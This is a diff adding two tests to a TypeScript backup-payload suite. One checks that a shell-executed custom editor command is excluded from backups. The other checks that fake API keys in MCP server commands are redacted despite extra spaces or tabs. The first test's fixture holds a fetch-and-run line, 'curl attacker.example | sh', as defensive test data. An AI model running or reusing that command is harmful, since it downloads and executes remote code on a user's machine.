@@ -206,6 +206,25 @@ describe("backup payload", () => {
     }
   });
 
+  it("never backs up the shell-executed editor command", () => {
+    const backup = {
+      appearance: {
+        theme: "dark" as const,
+        vimEnabled: true,
+        editorConfig: { editor: "custom" as const, customCommand: "curl attacker.example | sh" },
+      },
+    };
+    expect(serializeBackupPreferences(backup).toString("utf-8")).not.toContain("attacker.example");
+
+    const merged = mergeBackupPreferences(
+      { appearance: { editorConfig: { editor: "vscode" } } },
+      backup
+    );
+    expect(merged.appearance?.theme).toBe("dark");
+    expect(merged.appearance?.vimEnabled).toBe(true);
+    expect(merged.appearance?.editorConfig).toEqual({ editor: "vscode" });
+  });
+
   it("redacts credentials in stdio MCP commands but keeps shell env references", async () => {
     await write(
       muxRoot,
@@ -306,6 +325,55 @@ describe("backup payload", () => {
     ) as typeof mcp;
     expect(restored.servers.object.command).toBe("npx server --api-key sk-live-object --port 3000");
     expect(restored.servers.bare).toBe("env ACME_PASSWORD=hunter2 acme-mcp");
+  });
+
+  it("redacts a credential separated from its flag by extra spaces or a tab", async () => {
+    await write(
+      muxRoot,
+      "mcp.jsonc",
+      `{
+  "servers": {
+    "spaced": { "command": "npx server --api-key   sk-live-spaced --port 3000" },
+    "tabbed": { "command": "npx server\\t--api-key\\tsk-live-tabbed" },
+    "equalsSpaced": { "command": "npx server --api-key=  sk-live-equals" },
+    "envSpaced": { "command": "acme-mcp PASSWORD=\\tsk-live-env" },
+    "headerTabbed": { "command": "mcp-proxy -H\\t'X-API-Key: sk-live-header'" }
+  }
+}
+`
+    );
+
+    const payload = await createBackupPayload({
+      muxRoot,
+      muxVersion: "1.2.3",
+      sourceLabel: "test-host",
+    });
+    const mcp = jsonc.parse(payloadFileText(payload, "mcp.jsonc")) as {
+      servers: Record<string, { command: string }>;
+    };
+
+    // The separator is echoed back verbatim, so only the value is rewritten.
+    expect(mcp.servers.spaced?.command).toBe(
+      `npx server --api-key   ${REDACTED_BACKUP_VALUE} --port 3000`
+    );
+    expect(mcp.servers.tabbed?.command).toBe(`npx server\t--api-key\t${REDACTED_BACKUP_VALUE}`);
+    expect(mcp.servers.equalsSpaced?.command).toBe(
+      `npx server --api-key=  ${REDACTED_BACKUP_VALUE}`
+    );
+    expect(mcp.servers.envSpaced?.command).toBe(`acme-mcp PASSWORD=\t${REDACTED_BACKUP_VALUE}`);
+    expect(mcp.servers.headerTabbed?.command).toBe(
+      `mcp-proxy -H\t'X-API-Key: ${REDACTED_BACKUP_VALUE}'`
+    );
+    const exported = payloadFileText(payload, "mcp.jsonc");
+    for (const secret of [
+      "sk-live-spaced",
+      "sk-live-tabbed",
+      "sk-live-equals",
+      "sk-live-env",
+      "sk-live-header",
+    ]) {
+      expect(exported).not.toContain(secret);
+    }
   });
 
   it("preserves the execute bit through export and restore", async () => {
